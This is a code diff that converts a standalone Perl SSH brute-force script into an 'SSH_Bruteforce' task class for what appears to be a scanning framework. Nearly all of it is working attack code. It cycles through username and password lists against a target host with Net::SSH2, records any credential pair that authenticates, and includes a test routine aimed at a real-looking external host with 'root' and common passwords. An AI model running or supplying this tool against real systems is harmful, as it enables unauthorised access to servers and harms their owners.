@@ -1,73 +1,58 @@
-#!perl
-use Data::Dumper;
-use strict();
-use Net::SSH2;
+# SSH Bruteforce
+# --
 
-unless ( @ARGV ) { print q[Error: argument list is empty], "\n"; exit(0); };
+use MooseX::Declare;
+use core::task qw(execute);
 
-my ( @target, @users, @passw, $cnt, );
+# SSH bruteforce task
+class SSH_Bruteforce extends Task {
+    use Net::SSH2;
 
-@target	= &getinput( $ARGV[0] ) if ( $ARGV[0] );
-my $outfile = $ARGV[1];
-@users	= &getinput( $ARGV[2] ) if ( $ARGV[2] );
-@passw	= &getinput( $ARGV[3] ) if ( $ARGV[3] );
+    # Process
+    method _process(Str $target, Int $port, $users, $passw) {
+        my ($cnt, $ssh2);
 
-# die Dumper ( $target, $users, $passw );
+        $ssh2 = Net::SSH2->new();
 
-open(OUTFILE, ">>$outfile");
+        if ($ssh2->connect($target, $port)) {
+            map {
+                my $user = $_;
 
-my $ssh2 = Net::SSH2->new();
+                map {
+                    my $try = $_;
 
- if ( $ssh2->connect( $target[0] ) ) {
+                    $ssh2->auth_password($user, $try);
+                    my $ok = $ssh2->auth_ok();
 
-  map {
+                    if ($ok) {
+                        $self->_write_result("pair $user:$try is good for $target");
+                        return;
+                    }
 
-	  my $user = $_;
-	  map {
+                    $cnt++;
+                    sleep(1);
+                } @$passw;
+            } @$users;
 
-		  my $try = $_;
+            $self->_write_result("tried $cnt user:pass combinations on $target, none succeeded...");
+        } else {
+            $self->_write_result("Error: failed to connect to $target");
+        }
+    }
 
-		  $ssh2->auth_password( $user, $try );
-		  my $ok = $ssh2->auth_ok();
+    # Main function
+    method main($args) {
+        my ($users, $passw);
+        $users = $self->_get_arg($args, 0);
+        $passw = $self->_get_arg($args, 1);
 
-		  if( $ok ) {
+        $self->_process($self->target, $self->port || 22, $users, $passw);
+    }
 
-			print OUTFILE qq[pair $user:$try is good \@$target[0]\n];
-            close(OUTFILE);
-			exit(0);
-
-		  }
-
-		  $cnt++;
-		  sleep(1);
-
-	  } @passw;
-
-  } @users;
-
-  print OUTFILE qq[tried $cnt user:pass combinations on $target[0], none succeeded...\n];
-
+    # Test function
+    method test {
+        $self->_process("alt.org", 22, ["root", "test"], ["123", "qwerty"]);
+    }
 }
-else { print OUTFILE qq[Error: failed to connect to $target[0]\n]; }
-close(OUTFILE);
-exit(0);
 
-sub getinput {
-
-  my $fi = shift;
-
-  if ( open( IN, '<:utf8', $fi ) ) {
-
-	my @fo;
-
-	while( <IN> ){ chomp; push @fo, $_; }
-
-	close( IN );
-
-	return @fo;# if ( scalar @fo > 1 );
-	#return $fo[0];
-
-  }
-  else { print q[Error: cannot open file ], $fi, "\n"; exit(0); }
-
-};
+execute(SSH_Bruteforce->new());
